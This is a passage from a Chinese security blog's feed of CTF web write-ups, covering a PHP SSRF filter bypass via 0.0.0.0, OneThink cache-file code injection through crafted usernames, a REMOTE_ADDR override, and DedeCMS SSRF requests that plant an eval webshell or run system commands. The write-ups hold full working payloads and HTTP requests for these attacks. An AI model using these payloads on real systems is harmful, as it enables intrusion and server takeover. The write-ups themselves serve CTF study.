class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> <span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//error_reporting(E_ALL);</span></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span><span class="params">($url)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $match_result=preg_match(<span class="string">'/^(http|https)?:\/\/.*(\/)?.*$/'</span>,$url);</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (!$match_result)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">die</span>(<span class="string">'url fomat error'</span>);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">try</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        $url_parse=parse_url($url);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e)</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        dir(<span class="string">'url fomat error'</span>);</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $hostname=$url_parse[<span class="string">'host'</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="php">    <span class="comment">//var_dump($hostname);</span></span></span><br><span class="line"></span><br><span class="line"><span class="php">    $ip=gethostbyname($hostname);</span></span><br><span class="line"><span class="php">    $int_ip=ip2long($ip);</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> ip2long(<span class="string">'127.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'10.0.0.0'</span>)&gt;&gt;<span class="number">24</span> == $int_ip&gt;&gt;<span class="number">24</span> || ip2long(<span class="string">'172.16.0.0'</span>)&gt;&gt;<span class="number">20</span> == $int_ip&gt;&gt;<span class="number">20</span> || ip2long(<span class="string">'192.168.0.0'</span>)&gt;&gt;<span class="number">16</span> == $int_ip&gt;&gt;<span class="number">16</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span><span class="params">($url)</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span> (check_inner_ip($url))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">echo</span> $url.<span class="string">' is inner ip'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    <span class="keyword">else</span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="comment">//var_dump($url);</span></span></span><br><span class="line"><span class="php">        $ch = curl_init();</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_URL, $url);</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span></span><br><span class="line"><span class="php">        curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span></span><br><span class="line"><span class="php">        $output = curl_exec($ch);</span></span><br><span class="line"><span class="php">        $result_info = curl_getinfo($ch);</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> ($result_info[<span class="string">'redirect_url'</span>])</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            safe_request_url($result_info[<span class="string">'redirect_url'</span>]);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        curl_close($ch);</span></span><br><span class="line"><span class="php">        var_dump($output);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php">$url = $_POST[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!<span class="keyword">empty</span>($url))&#123;</span></span><br><span class="line"><span class="php">    safe_request_url($url);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="php">    highlight_file(<span class="keyword">__file__</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="comment">//hint23333:</span></span></span><br><span class="line"><span class="php"><span class="comment">//flag in flag.php</span></span></span><br><span class="line"><span class="php"><span class="comment">//phpinfo in phpinfo.php</span></span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>一开始对比代码，以为是 <code>try..catch</code> 块里的 <code>return false</code> 造成非预期。在师傅的指点下发现函数 <code>check_inner_ip()</code> 中少了对 <code>0.0.0.0</code> 过滤，于是试了一下 <code>url=http://0.0.0.0/flag.php</code>，发现竟然可以，但是在本机 <code>windows</code> 环境下复现时却不行。</p><p>查阅了相关资料，<code>0.0.0.0</code> 代表本机 ipv4 的所有地址，猜测可能发布的时候绑定用的 <code>0.0.0.0</code>，这样做包括本地ip和外网ip都能访问到服务，导致问题。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这道题也可以使用 DNS 重绑定（DNS rebinding）解决，有兴趣的师傅们可以去了解下，个人感觉可能是 ssrf 的通解了</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank" rel="noopener">us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages</a></li><li><a href="http://wubaoguo.com/2015/08/09/http%E5%8D%8F%E8%AE%AE/http%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80%E4%B9%8BURL/" target="_blank" rel="noopener">http协议基础之URL</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;学校举办的第九届极客大挑战，其中一道根据 Blackhat 议题出的 ssrf 题目，也是第一次尝试阅读 php 源码，望大牛们勿喷&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="PHP" scheme="https://jlkl.github.io/tags/PHP/"/>
    
      <category term="CTF" scheme="https://jlkl.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>2018巅峰极客第一场Web题两道</title>
    <link href="https://jlkl.github.io/2018/08/22/Web_09/"/>
    <id>https://jlkl.github.io/2018/08/22/Web_09/</id>
    <published>2018-08-22T14:26:57.000Z</published>
    <updated>2020-01-27T09:13:32.110Z</updated>
    
    <content type="html"><![CDATA[<h2 id="A-Simple-CMS"><a href="#A-Simple-CMS" class="headerlink" title="A Simple CMS"></a>A Simple CMS</h2><p><img src="/2018/08/22/Web_09/1.png" alt></p><p>一个16 年已经停更，基于 thinkphp 开发的 cms</p><a id="more"></a><p>网站目录大致如下，<code>www.zip</code> 是提供的源码文件</p><p><img src="/2018/08/22/Web_09/2.png" alt></p><p>搜索 <code>onethink 漏洞</code> 相关文章，会发现这篇 <a href="http://www.hackdig.com/06/hack-36510.htm" target="_blank" rel="noopener">http://www.hackdig.com/06/hack-36510.htm</a> （thinkphp框架写的开源系统或被getshell tp官方onethink举例），漏洞大致原因是因为写入缓存文件时没有对换行进行处理，缓存文件里有注册过的用户名，因为是 thinkphp 框架，缓存文件名字是固定的，导致可以写入任意代码执行命令。</p><p>比较坑的一点也算是考点，网上几乎所有文章写的缓存文件的名字都是一样的 <code>2bb202459c30a1628513f40ab22fa01a.php</code>，实际用给出的源码本地测试的时候，存储用户名的缓存文件名为 <code>onethink_d403acece4ebce56a3a4237340fbbe70.php</code>，比较有意思的是题目网站也是存在 <code>2bb202459c30a1628513f40ab22fa01a.php</code> 这个文件的，出题人的意图可能是不希望我们生搬硬套文章里的东西，而是懂原理，该怎么去利用。</p><p>后面看了出题人的 wp ，才发现考察的是代码审计，这里的代码修改了</p><p><img src="/2018/08/22/Web_09/4.png" alt></p><p>用户名过滤了 POST 和 Request 参数，虽然能够注册成功，但是登录的时候会提示用户名被禁用，登录不了也就不能成功把代码写入缓存文件，于是采用了其他文章的做法，（<a href="https://www.secpulse.com/archives/55862.html）" target="_blank" rel="noopener">https://www.secpulse.com/archives/55862.html）</a> 注册了 <code>%0a$a=$_GET[a];//</code> 和 <code>%0aecho `$a`;//</code> 两个用户，注意登录的顺序，最后访问缓存文件执行命令 <code>http://4619edd345904a91aa141701b0ec30b0b8db7f68e99d4a98.game.ichunqiu.com//Runtime/Temp/onethink_d403acece4ebce56a3a4237340fbbe70.php?a=cat%20/tmp/flag</code></p><p><img src="/2018/08/22/Web_09/3.png" alt></p><p>最后分享一道类似题目的思路，做题人发现 <code>flag.php</code> cat 提取不到内容，可能是因为权限不够，于是采用了复制命令 <code>cp flag.php flag.txt</code> 再 cat <code>flag.txt</code>的方法</p><h3 id="SERVER-‘REMOTE-ADDR’"><a href="#SERVER-‘REMOTE-ADDR’" class="headerlink" title="$_SERVER[‘REMOTE_ADDR’]"></a>$_SERVER[‘REMOTE_ADDR’]</h3><p>理论上不可以伪造 <code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> ，详细获取客户机 ip 地址可以参见：<a href="https://www.cnblogs.com/jiji262/archive/2012/07/12/2587725.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiji262/archive/2012/07/12/2587725.html</a></p><p>使用 <code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> 获取ip地址一定安全？</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $key =&gt; $value)&#123;</span></span><br><span class="line"><span class="php">$$key = $value;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'127.0.0.1'</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'Who are you? your ip is:'</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$_GET[<span class="string">'a'</span>]($_GET[<span class="string">'b'</span>]);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>post 或者 get 传参 <code>_SERVER[&#39;REMOTE_ADDR&#39;]=127.0.0.1</code>，可以绕过限制</p><p>参见：<a href="https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md" target="_blank" rel="noopener">https://github.com/mhchia/practice/blob/master/ctf/final/write_up.md</a></p><h2 id="DeDeFun"><a href="#DeDeFun" class="headerlink" title="DeDeFun"></a>DeDeFun</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">运维自己的网站，我还是喜欢用shell的方式，这样肯定没人能日进来了。</span><br><span class="line">1.php</span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($_SERVER[<span class="string">'REMOTE_ADDR'</span>] !== <span class="string">'127.0.0.1'</span>) &#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'Who are you? your ip is:'</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$_GET[<span class="string">'a'</span>]($_GET[<span class="string">'b'</span>]);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>dedecms 最新 5.7 版本，后台被删掉了，没有前端 getshell 的思路，想到 ssrf</p><p>这道题考察前端时间出的爆破后台目录的思路，详细可以查看 <a href="https://paper.tuisec.win/detail/d1053143f127862" target="_blank" rel="noopener">dedecms利用通配符找后台目录</a></p><p>简单提一下这个方法的思路，首先利用环境必须是 <strong>windows</strong>，利用了 windows 下的统配符 <code>&lt;</code>，其实这个思路本来就是 ssrf 的应用，利用 <code>uploadsafe.inc.php</code> 下的 <code>getimagesize</code> 函数，利用后台目录下的图片 <code>favicon.ico</code> ，如果猜测正确正常反馈，否则提示 <code>Upload filetype not allow !</code>， 具体可以参见文章。</p><p>ssrf 利用点找到了，接下来根据文章构造 poc ：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/tags.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: Str3am.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 333</span><br><span class="line"></span><br><span class="line">dopost=save&amp;_FILES[b4dboy][tmp_name]=http%3A%2f%2f127.0.0.1%2f1.php%3Fa%3Dassert%26b%3Dfile_put_contents%28%24_GET%5B1%5D%2Cbase64_decode%28%24_GET%5B2%5D%29%29%3B%261%3D.%2fuploads%2fstr3am1.php%262%3DPD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUW2NdKTs%2fPg%3D%3D&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif</span><br></pre></td></tr></table></figure><p>这里 shell 传递两个参数 a 和 b ，直接 post 传递一句话连接不上菜刀，柠檬师傅的思路是重新写一个 shell ，也学习到了，另外因为 web 目录没有写文件权限，所以写到了 uploads 目录下。</p><p>还有一种思路是直接命令执行，将 flag 读到可访问的位置，学习到一个变量 <code>$IFS</code>，相当于 bash 下的空格。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/tags.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: Str3am.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 230</span><br><span class="line"></span><br><span class="line">dopost=save&amp;_FILES[b4dboy][tmp_name]=http%3A%2f%2f127.0.0.1%2f1.php%3Fa%3Dsystem%26b%3Dcat%24IFS%2ftmp%2fflag_a4ga3QJsZ5DTCw8v%3E.%2fuploads%2fstr3am.txt&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif</span><br></pre></td></tr></table></figure><p>参考链接：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/<span class="number">2469</span></span><br><span class="line">https://paper.tuisec.win/detail/d<span class="number">1053143</span>f<span class="number">127862</span></span><br><span class="line">https://xz.aliyun.com/t/<span class="number">2064</span></span><br><span class="line">https://liuxianglai.github.io/<span class="number">2018</span>/<span class="number">07</span>/<span class="number">23</span>/<span class="symbol">%E5</span><span class="symbol">%B7</span><span class="symbol">%85</span><span class="symbol">%E5</span><span class="symbol">%B3</span><span class="symbol">%B0</span><span class="symbol">%E6</span><span class="symbol">%9</span>E<span class="symbol">%81</span><span class="symbol">%E5</span><span class="symbol">%AE</span><span class="symbol">%A2-CTF-</span><span class="symbol">%E9</span><span class="symbol">%83</span><span class="symbol">%A8</span><span class="symbol">%E5</span><span class="symbol">%88</span><span class="symbol">%86</span><span class="symbol">%E5</span><span class="symbol">%A4</span><span class="symbol">%8</span>D<span class="symbol">%E7</span><span class="symbol">%8</span>E<span class="symbol">%B0</span>/</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;A-Simple-CMS&quot;&gt;&lt;a href=&quot;#A-Simple-CMS&quot; class=&quot;headerlink&quot; title=&quot;A Simple CMS&quot;&gt;&lt;/a&gt;A Simple CMS&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2018/08/22/Web_09/1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;一个16 年已经停更，基于 thinkphp 开发的 cms&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="PHP" scheme="https://jlkl.github.io/tags/PHP/"/>
    
      <category term="CTF" scheme="https://jlkl.github.io/tags/CTF/"/>
    
  </entry>
  
</feed>
